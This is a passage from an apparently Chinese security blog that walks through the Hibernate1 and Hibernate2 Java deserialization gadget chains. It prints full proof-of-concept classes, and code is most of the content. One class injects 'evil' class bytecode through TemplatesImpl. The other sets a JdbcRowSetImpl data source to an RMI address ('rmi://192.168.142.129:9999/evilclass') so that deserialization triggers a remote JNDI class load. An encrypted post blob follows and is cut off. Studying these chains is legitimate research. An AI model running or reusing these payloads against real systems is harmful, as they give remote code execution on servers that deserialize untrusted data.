class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.Type;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hibernate1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Hibernate1.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; componentTypeClass             = Class.forName(<span class="string">&quot;org.hibernate.type.ComponentType&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Method</span>  <span class="variable">method</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredMethod(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object getter;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       getterImpl  = Class.forName(<span class="string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(<span class="literal">null</span>, <span class="literal">null</span>, method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       basicGetter = Class.forName(<span class="string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(tmpl.getClass(), method, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tuplizer</span> <span class="operator">=</span> createWithoutConstructor(pojoComponentTuplizerClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> abstractComponentTuplizerClass.getDeclaredField(<span class="string">&quot;getters&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> Array.newInstance(getter.getClass(), <span class="number">1</span>);</span><br><span class="line">        Array.set(getters, <span class="number">0</span>, getter);</span><br><span class="line">        field.set(tuplizer, getters);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">type</span> <span class="operator">=</span> createWithoutConstructor(componentTypeClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span></span><br><span class="line">        setFieldValue(type,<span class="string">&quot;componentTuplizer&quot;</span>,tuplizer);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertySpan&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertyTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;(Type) type&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span></span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">typedValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>((Type) type, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建反序列化用 HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(typedValue, <span class="string">&quot;su18&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span></span><br><span class="line">        setFieldValue(typedValue,<span class="string">&quot;value&quot;</span>,tmpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230713233831925.png" alt="image-20230713233831925"></p><p><strong>完整的利用链</strong></p><p><img src="../images/image-20230713233920372.png" alt="image-20230713233920372"></p><p><strong>这里这样写是因为版本的不同  调用链在这一块也是会不同的</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><strong>利用说明：</strong><ul><li><strong>由 HashMap 的反序列化触发 TypedValue 的 <code>hashCode</code>，调用到 ComponentType 的 <code>getHashCode</code> 方法，调用 PojoComponentTuplizer 的 <code>getPropertyValue</code> 的方法，然后使用 <code>BasicPropertyAccessor$BasicGetter</code> 调用 <code>get</code> 方法，触发 TemplatesImpl 的 <code>getOutputProperties</code> 方法。</strong></li></ul></li></ol><ol><li>依赖版本</li></ol><p><strong>Hibernate : 3-5</strong></p><ol><li><strong>本次复现用的依赖版本</strong></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.hibernate/hibernate-core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.11.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230713234611171.png" alt="image-20230713234611171"></p><p><strong>这位师傅提出了一个想法  可以学习一下为什么</strong>   </p><h2 id="Hibernate2"><a href="#Hibernate2" class="headerlink" title="Hibernate2"></a>Hibernate2</h2><p>既然是触发 <code>getter</code> 方法，这就让我们想到了 <code>fastjson</code> 的经典触发方式，除了 <code>TemplatesImpl</code> 实例化恶意类字节码，还有 <code>JdbcRowSetImpl</code> 触发恶意 <code>JNDI</code> 查询，<code>Hibernate2</code> 就是这种方式，不知道这两个漏洞是谁先出的，谁借鉴的谁。</p><p>在 <code>fastjson</code> 中使用 <code>JdbcRowSetImpl</code> 的 <code>setAutoCommit</code>（setter）方法触发 <code>JNDI</code> 查询，而在 <code>Hibernate2</code> 中由于是触发 getter 方法，因此我们选择 <code>getDatabaseMetaData</code>。</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.Type;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hibernate2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Hibernate1.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; componentTypeClass             = Class.forName(<span class="string">&quot;org.hibernate.type.ComponentType&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成JdbcRowxxx</span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        rs.setDataSourceName(<span class="string">&quot;rmi://192.168.142.129:9999/evilclass&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> JdbcRowSetImpl.class.getDeclaredMethod(<span class="string">&quot;getDatabaseMetaData&quot;</span>);</span><br><span class="line">        Object getter;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       getterImpl  = Class.forName(<span class="string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(<span class="literal">null</span>, <span class="literal">null</span>, method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       basicGetter = Class.forName(<span class="string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(rs.getClass(), method, <span class="string">&quot;databaseMetaData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tuplizer</span> <span class="operator">=</span> createWithoutConstructor(pojoComponentTuplizerClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> abstractComponentTuplizerClass.getDeclaredField(<span class="string">&quot;getters&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> Array.newInstance(getter.getClass(), <span class="number">1</span>);</span><br><span class="line">        Array.set(getters, <span class="number">0</span>, getter);</span><br><span class="line">        field.set(tuplizer, getters);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">type</span> <span class="operator">=</span> createWithoutConstructor(componentTypeClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span></span><br><span class="line">        setFieldValue(type,<span class="string">&quot;componentTuplizer&quot;</span>,tuplizer);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertySpan&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertyTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;(Type) type&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span></span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">typedValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>((Type) type, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建反序列化用 HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(typedValue, <span class="string">&quot;su18&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span></span><br><span class="line">        setFieldValue(typedValue,<span class="string">&quot;value&quot;</span>,rs);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230714002402940.png" alt="image-20230714002402940"></p><p><img src="../images/image-20230714002411609.png" alt="image-20230714002411609"></p><p><strong>这样就能执行了   (只是比较慢)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/&quot;&gt;参考链</summary>
      
    
    
    
    
    <category term="java-Hibernate" scheme="https://ke1nys.github.io/tags/java-Hibernate/"/>
    
  </entry>
  
  <entry>
    <title>show-JWT</title>
    <link href="https://ke1nys.github.io/posts/fb5deb43.html"/>
    <id>https://ke1nys.github.io/posts/fb5deb43.html</id>
    <published>2023-07-10T15:10:19.000Z</published>
    <updated>2023-07-19T11:38:38.088Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="341e88597f819d950b0f5c90612b48ba043f42566158cb0c370a43fd3332b7da">1a90164da2a38547586d85c848ea23230f5c6975fdd195e942307e28f90af7f53e25b7419934e13f43d5ab4703649a64f7fd4197c6071b3c662be91df9c59d4273b4e410e8f1273b62affe2616798428f731a60965a4fd6ee89839b15f9dd548540c001a932cd9b4a1c588c89a3fedbb1026c34909f1e48f2e36eb7c345d5c946746061f4c30ee3c16fe9052c85a859a08f9460070883d957adfcc47f7fba5d672cb0348396dd596110c35e7e619c2dd918782829a41468cef771c8f10167e56a4bc77b9a43ed403650f9afffa5af89758e332bb7c92c75f50b66cc0c1dd01fc4eb406f87b1f4cc5f8649f5cdd5fd83a51b44c5ae9e5f287246cfdbeec0b0e1c21b3baade700f0d47be79175ecc8ec1a859e54c5c7f4bfc0fca182d9cbdb9f517171645ecb3fe0929d110cc96f1482a045fe5ef9355ae5cc0f1279314673ab69aa733e4fe1b30c82af21d692b70af135fed696a0ec45426fab44b2caa951cabb875941f0bff5ff927321979fe648f1c05dec9e5292ee9a1d0ed6f977acca67b8e5667efa7e14b3b4712947f7c14966c6e92d59c565dd5c0af73baf1def20762824132c65ed817e2d122d62d7763468924c1e368b522347c9359117996403333b86ce8dcf997b8e82f6ae0b43eec6f575996318da67e14f7ea1134746c65ea1887ea8532c39990a8bf057fb6bbdbc20f9a60f93042e6eb5987364a7c582425d893193190fed1d52e0ec0001bccff0997ba7541ba5536f65fcce518ed7325bf2ad2059691ad5b060f78727dc5e6972f331569f7f6ca18d547c1f0ef4a777224f9778b01ddca4687099fbc5f69417ebc23f37a13504b298b3510797c488d6dfc645d31141f232e86ad7c934348d9173d6ae5b6a81856e0af82ccbb3d2a061c0ca46418d24a80ae320fb790929e43027bf14c4ff21124f5111db6896afdb40414573f2f386fcb262b057a0cad56d2b09b53016a21947a682d6fda43bff0f5665e766887279c0546afcad4c98325ea82058219710b9a0a04c0c5a6289adcd56a2f193029d9239226b7b69859c1c2185a2a0bc294978446cfda574df46aec765f3530f2091a930539beabf8d74850cb504d0fb683c8bde573fc00e394a57af53ca33f32d5494d147c4d022c750d7abf0cf82f88dab77c0276f425ab0999577ccaeda979af589c07e4bfa6ed0d0ba0453c8f3f71dcf654268358e678fff8d2e2a3a4d9b65d96ff82e32c8b7c04543d12eb51d0d5d73357379559281ac0026593fba3454405038dbfa5428fd027b03933faa29c63c98a984ffcc7c91383cec20aee3f4827b7db1998be8783676734c90a3f79fadd64074ccd97ddb3ce0d91265d8fa1add6c5af62599b43d1d3e86cb648cb7dc865767795d20aace136e18148235bd0394b6d4e4ccb44dbefedeca289e3183fef899409a4444459131e981bb369c25ca7b613da6b41b5b36bcd8d69c8139634e183699bba767d924da87fb1f90519514822359a18fb347dc9b26ce76b192d7fc6d200ad89b46ca8e298e3a4d77916046912dc5a8b94edc907c5c3e79f7b11f14ad3b27734e6eb100c444f56ff9d8682e6953c27c458bdc585100f669544ee9d4775d068d40ea2c8f2d7f808281961d956402a26b5c463f5a450365651dd2d4692d0a9953a23612fbfc50eeda434ae271847cbeeb27d4a2728